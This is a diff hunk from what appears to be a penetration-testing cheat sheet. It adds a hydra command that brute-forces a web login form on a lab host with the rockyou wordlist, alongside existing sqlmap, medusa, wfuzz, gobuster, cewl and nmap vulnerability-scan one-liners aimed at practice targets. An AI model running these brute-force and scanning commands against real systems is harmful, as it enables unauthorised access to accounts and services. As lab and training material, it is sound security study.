@@ -219,6 +219,7 @@ sqlmap -u http://192.168.1.10/ --crawl=5 --dbms=mysql
 cewl http://192.168.1.10/ -m 6 -w special_wordlist.txt
 cewl http://runner.htb/ | grep -v CeWL > custom-wordlist.tx # For creating custom wordlist
 medusa -h 192.168.1.10 -u admin -P  wordlist.txt -M http -m DIR:/admin -T 10
+hydra -l axel -P /usr/share/wordlists/rockyou.txt cat.htb http-get-form "/join.php:loginUsername=axel&loginPassword=^PASS^&loginForm=Login:Incorrect username or password" -I -t 54 -v
 wfuzz -u http://10.13.37.11:5000/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
 nmap -p 80 -n -v -sV -Pn --script http-backup-finder,http-config-backup,http-errors,http-headers,http-iis-webdav-vuln,http-internal-ip-disclosure,http-methods,http-php-version,http-qnap-nas-info,http-robots.txt,http-shellshock,http-slowloris-check,http-waf-detect,http-vuln* 192.168.1.10
 gobuster dir -u http://<address>/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -s '200,204,301,302,307,403,500' -e -x txt,php,html
